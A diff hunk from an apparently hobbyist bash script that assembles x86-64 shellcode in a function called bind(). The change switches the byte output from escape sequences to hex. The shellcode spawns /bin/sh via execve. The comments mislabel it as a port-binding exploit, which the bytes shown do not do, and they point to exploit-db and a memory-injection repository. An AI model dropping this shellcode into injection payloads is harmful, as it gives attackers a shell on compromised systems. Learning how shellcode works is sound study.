@@ -3,13 +3,13 @@ function bind()
 	# I have found this shell code only and it seems to be a BIND exploit
 	# I believe it can be useful to learn how to listen a port:
 	local code="";
-	code="${code}$(xor rax rax | xd2esc)";
-	code="${code}${MOV_rax_rdx}";
-	code="${code}${MOV_rax_rsi}";
-	code="${code}$(prefix rdi | xd2esc)\x8d\x3d\x04\x00\x00\x00";# lea rdi,[rel 0xb]
-	code="${code}$(add ${SYS_EXECVE} al | xd2esc)";
+	code="${code}$(xor rax rax)";
+	code="${code}$(mov rdx rax)";
+	code="${code}$(mov rsi rax)";
+	code="${code}$(prefix rdi)8d3d04000000";# lea rdi,[rel 0xb]
+	code="${code}$(add al ${SYS_EXECVE})";
 	code="${code}${SYSCALL}";
-	code="${code}\x2f\x62\x69\x6e\x2f\x73\x68\x00\xcc\x90\x90\x90";
+	code="${code}2f62696e2f736800cc909090";
 #  https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.
 #
 # https://www.exploit-db.com/exploits/41128
